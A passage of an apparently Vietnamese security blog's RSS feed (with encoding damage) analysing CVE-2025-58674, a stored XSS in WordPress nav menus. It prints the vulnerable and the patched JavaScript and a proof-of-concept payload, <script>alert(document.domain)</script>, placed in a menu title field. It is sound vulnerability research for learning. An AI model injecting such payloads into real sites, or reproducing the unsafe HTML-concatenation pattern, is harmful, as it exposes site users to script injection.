aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html?highlight=lfi#lfi--rfi-using-php-wrappers--protocols&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;File Inclusion/Path traversal ‚Äî Hacktrick&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/social-polls-by-opinionstage/vulnerability/wordpress-poll-survey-quiz-maker-plugin-by-opinion-stage-plugin-19-11-0-local-file-inclusion-vulnerability?_s_id=cve&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt; WordPress Poll, Survey &amp;amp; Quiz Maker Plugin by Opinion Stage Plugin &amp;lt;= 19.11.0 is vulnerable to Local File Inclusion &lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-58674 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-10-11-cve-2025-58674/</link>
      <pubDate>Sat, 11 Oct 2025 19:18:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-10-11-cve-2025-58674/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-11-cve-2025-58674/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;p&gt;L·ªó h·ªïng &lt;strong&gt;Stored Cross Site Scripting(XSS)&lt;/strong&gt; x·∫£y ra tr√™n WordPress Core tr∆∞·ªõc phi√™n b·∫£n &lt;code&gt;6.8.3&lt;/code&gt;. Nguy√™n nh√¢n do sai x·ª≠ l√Ω ƒë·∫ßu v√†o khi sinh trang web ƒë·ªông, t√°c ƒë·ªông ƒë·∫øn ch·ª©c nƒÉng t·∫°o menu (&lt;code&gt;nav menus&lt;/code&gt;)&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-58674&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-58674&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Cross Site Scripting (XSS)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 6.8.2&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 6.8.3&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (5.9)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Author&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPressCore&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Wordpress Core Versions&lt;/strong&gt;: &lt;strong&gt;v6.8.2&lt;/strong&gt; (vulnerable) v√† &lt;strong&gt;v6.8.3&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh (diff) n√†o ƒë·ªÉ ki·ªÉm tra v√† so s√°nh kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Theme&lt;/strong&gt; - &lt;a href=&#34;https://wordpress.org/themes/astra/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Astra&lt;/strong&gt;&lt;/a&gt;: Theme r·∫•t ph·ªï bi·∫øn v·ªõi ng∆∞·ªùi d√πng WordPress, h·ªó tr·ª£ t·∫°o &lt;strong&gt;nav memu&lt;/strong&gt; nhanh ch√≥ng.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;WordPress l√† ph·∫ßn m·ªÅm m√£ ngu·ªìn m·ªü, c√≥ kho l∆∞u tr·ªØ n·∫±m ·ªü github n√™n ta c√≥ th·ªÉ t√¨m ƒë·∫øn &lt;a href=&#34;https://github.com/WordPress/WordPress/commit/e5caef19d3e842cc9c8c94621b223a9a696fb5b3&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;commit&lt;/a&gt; li√™n quan ƒë·∫øn s·ª± ki·ªán v√° l·ªó h·ªïng XSS ƒë·ªÉ quan s√°t s·ª± thay ƒë·ªïi, hi·ªÉu ƒë∆∞·ª£c l·ªó h·ªïng x·∫£y ra ·ªü ƒë√¢u.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;B·∫£n l·ªói&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;updateParentDropdown : function() {&#xA;    return this.each(function(){&#xA;        var menuItems = $( &amp;#39;#menu-to-edit li&amp;#39; ),&#xA;            parentDropdowns = $( &amp;#39;.edit-menu-item-parent&amp;#39; );&#xA;&#xA;        $.each( parentDropdowns, function() {&#xA;            var parentDropdown = $( this ),&#xA;                $html = &amp;#39;&amp;#39;,&#xA;                $selected = &amp;#39;&amp;#39;,&#xA;                currentItemID = parentDropdown.closest( &amp;#39;li.menu-item&amp;#39; ).find( &amp;#39;.menu-item-data-db-id&amp;#39; ).val(),&#xA;                currentparentID = parentDropdown.closest( &amp;#39;li.menu-item&amp;#39; ).find( &amp;#39;.menu-item-data-parent-id&amp;#39; ).val(),&#xA;                currentItem = parentDropdown.closest( &amp;#39;li.menu-item&amp;#39; ),&#xA;                currentMenuItemChild = currentItem.childMenuItems(),&#xA;                excludeMenuItem = [ currentItemID ];&#xA;&#xA;            if ( currentMenuItemChild.length &amp;gt; 0 ) {&#xA;                $.each( currentMenuItemChild, function(){&#xA;                    var childItem = $(this),&#xA;                        childID = childItem.find( &amp;#39;.menu-item-data-db-id&amp;#39; ).val();&#xA;&#xA;                    excludeMenuItem.push( childID );&#xA;                });&#xA;            }&#xA;&#xA;            if ( currentparentID == 0 ) {&#xA;                $selected = &amp;#39;selected&amp;#39;;&#xA;            }&#xA;&#xA;            $html &amp;#43;= &amp;#39;&amp;lt;option &amp;#39; &amp;#43; $selected &amp;#43; &amp;#39; value=&amp;#34;0&amp;#34;&amp;gt;&amp;#39; &amp;#43; wp.i18n._x( &amp;#39;No Parent&amp;#39;, &amp;#39;menu item without a parent in navigation menu&amp;#39; ) &amp;#43; &amp;#39;&amp;lt;/option&amp;gt;&amp;#39;;&#xA;&#xA;            $.each( menuItems, function() {&#xA;                var menuItem = $(this),&#xA;                $selected = &amp;#39;&amp;#39;,&#xA;                menuID = menuItem.find( &amp;#39;.menu-item-data-db-id&amp;#39; ).val(),&#xA;                menuTitle = menuItem.find( &amp;#39;.edit-menu-item-title&amp;#39; ).val();&#xA;&#xA;                if ( ! excludeMenuItem.includes( menuID ) ) {&#xA;                    if ( currentparentID == menuID ) {&#xA;                        $selected = &amp;#39;selected&amp;#39;;&#xA;                    }&#xA;                    $html &amp;#43;= &amp;#39;&amp;lt;option &amp;#39; &amp;#43; $selected &amp;#43; &amp;#39; value=&amp;#34;&amp;#39; &amp;#43; menuID &amp;#43; &amp;#39;&amp;#34;&amp;gt;&amp;#39; &amp;#43; menuTitle &amp;#43; &amp;#39;&amp;lt;/option&amp;gt;&amp;#39;;&#xA;                }&#xA;            });&#xA;&#xA;            parentDropdown.html( $html );&#xA;        });&#xA;        &#xA;    });&#xA;},&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong phi√™n b·∫£n l·ªói, gi√° tr·ªã &lt;code&gt;menuTitle&lt;/code&gt; ƒë∆∞·ª£c ch√®n v√†o th·∫ª &lt;code&gt;&amp;lt;option&amp;gt;&lt;/code&gt; v√† ƒë∆∞·ª£c hi·ªÉn th·ªã ra HTML b·∫±ng ph∆∞∆°ng th·ª©c &lt;a href=&#34;https://api.jquery.com/html/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;html()&lt;/a&gt; c·ªßa &lt;strong&gt;jQuery&lt;/strong&gt; m√† kh√¥ng c√≥ b·∫•t k·ª≥ c∆° ch·∫ø ngƒÉn ch·∫∑n XSS n√†o. H√†m &lt;a href=&#34;https://api.jquery.com/html/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;html()&lt;/a&gt; d√πng ƒë·ªÉ thay th·∫ø n·ªôi dung HTML b√™n trong ph·∫ßn t·ª≠ hi·ªán t·∫°i, n√™n n·∫øu &lt;code&gt;menuTitle&lt;/code&gt; ch·ª©a m√£ ƒë·ªôc th√¨ m√£ ƒë√≥ s·∫Ω ƒë∆∞·ª£c th·ª±c thi tr√™n tr√¨nh duy·ªát.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;B·∫£n v√°&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;updateParentDropdown : function() {&#xA;    return this.each(function(){&#xA;        var menuItems = $( &amp;#39;#menu-to-edit li&amp;#39; ),&#xA;            parentDropdowns = $( &amp;#39;.edit-menu-item-parent&amp;#39; );&#xA;&#xA;        $.each( parentDropdowns, function() {&#xA;            var parentDropdown = $( this ),&#xA;                currentItemID = parseInt( parentDropdown.closest( &amp;#39;li.menu-item&amp;#39; ).find( &amp;#39;.menu-item-data-db-id&amp;#39; ).val() ),&#xA;                currentParentID = parseInt( parentDropdown.closest( &amp;#39;li.menu-item&amp;#39; ).find( &amp;#39;.menu-item-data-parent-id&amp;#39; ).val() ),&#xA;                currentItem = parentDropdown.closest( &amp;#39;li.menu-item&amp;#39; ),&#xA;                currentMenuItemChild = currentItem.childMenuItems(),&#xA;                excludeMenuItem =  /** @type {number[]} */ [ currentItemID ];&#xA;&#xA;            parentDropdown.empty();&#xA;&#xA;            if ( currentMenuItemChild.length &amp;gt; 0 ) {&#xA;                $.each( currentMenuItemChild, function(){&#xA;                    var childItem = $(this),&#xA;                        childID = parseInt( childItem.find( &amp;#39;.menu-item-data-db-id&amp;#39; ).val() );&#xA;&#xA;                    excludeMenuItem.push( childID );&#xA;                });&#xA;            }&#xA;&#xA;            parentDropdown.append(&#xA;                $( &amp;#39;&amp;lt;option&amp;gt;&amp;#39;, {&#xA;                    value: &amp;#39;0&amp;#39;,&#xA;                    selected: currentParentID === 0,&#xA;                    text: wp.i18n._x( &amp;#39;No Parent&amp;#39;, &amp;#39;menu item without a parent in navigation menu&amp;#39; ),&#xA;                } )&#xA;            );&#xA;&#xA;            $.each( menuItems, function() {&#xA;                var menuItem = $(this),&#xA;                menuID = parseInt( menuItem.find( &amp;#39;.menu-item-data-db-id&amp;#39; ).val() ),&#xA;                menuTitle = menuItem.find( &amp;#39;.edit-menu-item-title&amp;#39; ).val();&#xA;&#xA;                if ( ! excludeMenuItem.includes( menuID ) ) {&#xA;                    parentDropdown.append(&#xA;                        $( &amp;#39;&amp;lt;option&amp;gt;&amp;#39;, {&#xA;                            value: menuID.toString(),&#xA;                            selected: currentParentID === menuID,&#xA;                            text: menuTitle,&#xA;                        } )&#xA;                    );&#xA;                }&#xA;            });&#xA;        });&#xA;        &#xA;    });&#xA;},&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;B·∫£n v√° ƒë√£ kh·∫Øc ph·ª•c l·ªó h·ªïng b·∫±ng c√°ch ch·ªâ ƒë·ªãnh r√µ &lt;code&gt;menuTitle&lt;/code&gt; ƒë∆∞·ª£c g√°n v√†o thu·ªôc t√≠nh &lt;code&gt;text&lt;/code&gt; thay v√¨ n·ªôi dung HTML.&#xA;ƒêi·ªÅu n√†y ƒë·∫£m b·∫£o gi√° tr·ªã c·ªßa &lt;code&gt;menuTitle&lt;/code&gt; ƒë∆∞·ª£c x·ª≠ l√Ω nh∆∞ vƒÉn b·∫£n thu·∫ßn t√∫y, kh√¥ng th·ªÉ ch·ª©a ho·∫∑c th·ª±c thi m√£ JavaScript ƒë·ªôc h·∫°i.&#xA;Nh·ªù ƒë√≥, d·ªØ li·ªáu ƒë∆∞·ª£c th√™m v√†o th·∫ª &lt;code&gt;&amp;lt;option&amp;gt;&lt;/code&gt; ho√†n to√†n an to√†n v√† lo·∫°i b·ªè kh·∫£ nƒÉng t·∫•n c√¥ng XSS th√¥ng qua gi√° tr·ªã &lt;code&gt;menuTitle&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-11-cve-2025-58674/dif.png&#34;&#xA;    alt=&#34;So s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;So s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Inpsect code tr√™n tr√¨nh duy·ªát ta th·∫•y &lt;code&gt;menuItems = #menu-to-edit li&lt;/code&gt; l√† m·∫£ng c√°c th·∫ª &lt;code&gt;&amp;lt;li&amp;gt;&lt;/code&gt; thu·ªôc th·∫ª &lt;code&gt;&amp;lt;ul&amp;gt;&lt;/code&gt; c√≥ &lt;code&gt;id=menu-to-edit&lt;/code&gt;&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-11-cve-2025-58674/viewsource.png&#34;&#xA;    alt=&#34;Inspect code tr√™n tr√¨nh duy·ªát&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Inspect code tr√™n tr√¨nh duy·ªát&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;H√†m &lt;code&gt;updateParentDropdown&lt;/code&gt; s·∫Ω duy·ªát c√°c th·∫ª &lt;code&gt;&amp;lt;li&amp;gt;&lt;/code&gt; l·∫•y value c·ªßa &lt;code&gt;&amp;lt;input&amp;gt;&lt;/code&gt; c√≥ class &lt;code&gt;edit-menu-item-title&lt;/code&gt;, g√°n gi√° tr·ªã ƒë√≥ cho &lt;code&gt;menuTitle&lt;/code&gt; trong th·∫ª &lt;code&gt;&amp;lt;option&amp;gt;&lt;/code&gt; v√† hi·ªÉn th·ªã ra HTML.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-11-cve-2025-58674/viewsource1.png&#34;&#xA;    alt=&#34;Inspect DOM sau khi th√™m menu&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Inspect DOM sau khi th√™m menu&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;&lt;strong&gt;Tr√™n UI&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-11-cve-2025-58674/UIlist.png&#34;&#xA;    alt=&#34;H√¨nh ·∫£nh hi·ªÉn th·ªã tr√™n giao di·ªán qu·∫£n tr·ªã&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;H√¨nh ·∫£nh hi·ªÉn th·ªã tr√™n giao di·ªán qu·∫£n tr·ªã&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;Trong &lt;a href=&#34;https://github.com/WordPress/WordPress/commit/e5caef19d3e842cc9c8c94621b223a9a696fb5b3&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;commit&lt;/a&gt; c√≥ m·ªôt s·ª≠a ƒë·ªïi t∆∞·ªüng ch·ª´ng l√† h·ªØu √≠ch, nh∆∞ng ch·∫£ c√≥ √≠ch cho qu√° tr√¨nh ph√¢n t√≠ch.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-11-cve-2025-58674/htmlett.png&#34;&#xA;    alt=&#34;HTML entity encode (1)&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;HTML entity encode (1)&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;T√¥i ƒë√£ s·ª≠ d·ª•ng &lt;code&gt;//&lt;/code&gt; ƒë·ªÉ comment t·∫•t c·∫£ c√°c d√≤ng li√™n quan ƒë·∫øn &lt;code&gt;html_entity_decode&lt;/code&gt; c·ªßa &lt;code&gt;origin_title&lt;/code&gt; nh∆∞ng v·∫´n khai th√°c ƒë∆∞·ª£c. Tr∆∞·ªõc ƒë√≥ t√¥i ƒë√£ ƒë·∫∑t debug ƒë·∫øn c√°c v·ªã tr√≠ n√†y nh∆∞ng kh√¥ng c√≥ g√¨ x·∫£y ra.&lt;/p&gt;&#xA;&lt;p&gt;Ngo√†i vi·ªác s·ª≠ d·ª•ng comment, t√¥i ƒë√£ ch·ªçn menu ch·ª©a XSS payload v√† click &lt;kbd&gt;Add to Menu&lt;/kbd&gt;, b·∫Øt request b·∫±ng &lt;strong&gt;BurpSuite&lt;/strong&gt; ƒë·ªÉ xem gi√° tr·ªã ƒë∆∞·ª£c add c√≥ ƒë∆∞·ª£c html entity encode kh√¥ng.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-11-cve-2025-58674/htmlett1.png&#34;&#xA;    alt=&#34;HTML entity encode (2)&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;HTML entity encode (2)&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;&lt;code&gt;menu-item-title&lt;/code&gt; l√† gi√° tr·ªã l·∫•y th·∫ª input c√≥ name &lt;code&gt;menu-item[-5][menu-item-title]&lt;/code&gt; t·ª´ &lt;code&gt;post-title&lt;/code&gt; ƒë∆∞·ª£c &lt;strong&gt;check&lt;/strong&gt; ƒë·ªÉ th√™m v√†o body c·ªßa request&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;input type=&amp;#34;hidden&amp;#34; class=&amp;#34;menu-item-title&amp;#34; name=&amp;#34;menu-item[-5][menu-item-title]&amp;#34; value=&amp;#34;&amp;lt;script&amp;gt;alert(document.domain)&amp;lt;/script&amp;gt;&amp;#34;&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;C√≥ 1 ƒëi·ªÅu th√∫ v·ªã ·ªü ƒë√¢y, tr√¨nh duy·ªát l·∫•y gi√° tr·ªã ƒë√£ decode html entity ƒë·ªÉ th√™m v√†o request, bi·∫øt gi√° tr·ªã t·ª´ server tr∆∞·ªõc khi echo ra HTML ƒë√£ ƒë∆∞·ª£c encode&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-11-cve-2025-58674/htmlett2.png&#34;&#xA;    alt=&#34;Tr√¨nh duy·ªát decode HTML entity tr∆∞·ªõc khi g·ª≠i&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Tr√¨nh duy·ªát decode HTML entity tr∆∞·ªõc khi g·ª≠i&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;üëâ Browser ƒë√£ decode html entity tr∆∞·ªõc khi hi·ªÉn th·ªã ra HTML.&lt;/p&gt;&#xA;&lt;p&gt;Tr√™n DOM, sau khi click &lt;kbd&gt;Add to Menu&lt;/kbd&gt; =&amp;gt; &lt;code&gt;attachTabsPanelListeners&lt;/code&gt; ƒë∆∞·ª£c g·ªçi v√† th√™m gi√° tr·ªã v·ª´a &lt;strong&gt;selected&lt;/strong&gt; v√†o bottom c·ªßa menu item.&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-11-cve-2025-58674/addbottom.png&#34;&#xA;    alt=&#34;Th√™m item v√†o cu·ªëi danh s√°ch menu&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Th√™m item v√†o cu·ªëi danh s√°ch menu&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;üëâ &lt;code&gt;edit-menu-item-title&lt;/code&gt; c√≥ gi√° tr·ªã ch·ª©a XSS payload. H√†m &lt;code&gt;updateParentDropdown&lt;/code&gt; s·∫Ω l·∫•y n√≥ g√°n cho th·∫ª &lt;code&gt;&amp;lt;option&amp;gt;&lt;/code&gt; =&amp;gt; XSS x·∫£y ra&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;sources--sinks&#34;&gt;&lt;span&gt;Sources &amp;amp; Sinks&lt;/span&gt;&#xA;  &lt;a href=&#34;#sources--sinks&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  